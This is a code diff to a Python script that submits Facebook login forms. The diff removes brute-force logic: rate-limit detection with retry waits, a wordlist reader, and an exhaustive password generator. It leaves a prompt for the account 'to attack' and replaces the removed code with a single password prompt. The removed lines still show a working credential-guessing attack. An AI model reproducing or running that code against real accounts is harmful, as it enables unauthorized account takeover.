@@ -31,56 +31,6 @@ def send_login(self, email, password):
     self.browser.form['pass'] = password
     return self.browser.submit().read()
 
-def is_logged_in(self, data):
-    return 2 in data
-
-def is_too_often(self, data):
-    return 1 in data
-
-def try_password(self, email, password):
-    print ('Trying %s' % password)
-    data = self.send_login(email, password)
-
-    if self.is_too_often(data):
-        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
-        sleep(30)
-        self.try_password(password)
-
-    if self.is_logged_in(data):
-        print ('Password found: %s' % password )
-        sys.exit()
-
-def run(self, email, password_generator):
-    for password in password_generator:
-        self.try_password(email, password)
-
-
-def readline_generator(fp):
-    """
-    Lazy function (generator) to read a file piece by piece.
-    Default chunk size: 1k.
-    """
-    while True:
-        data = fp.readline()
-        if not data:
-            break
-        yield data.strip()
-
-def alphabet_generator(l_start, l_end):
-    for n in range(l_start, l_end):
-        for xs in itertools.product(CHRS, repeat=n):
-            yield ''.join(xs)
-
 
 email = input('Email address or username to attack:')
-
-
-try:
-    with open(sys.argv[6], 'r') as fp:
-        engine.run(email, readline_generator(fp))
-except IndexError:
-    min_chars = input(
-        'Minumum number of characters in password (default: 3):') or 8
-    max_chars = input(
-        'Maximum number of characters in password (default: 8):') or 9
-    engine.run(email, alphabet_generator(int(min_chars), int(max_chars)))
+password = input('Password:')
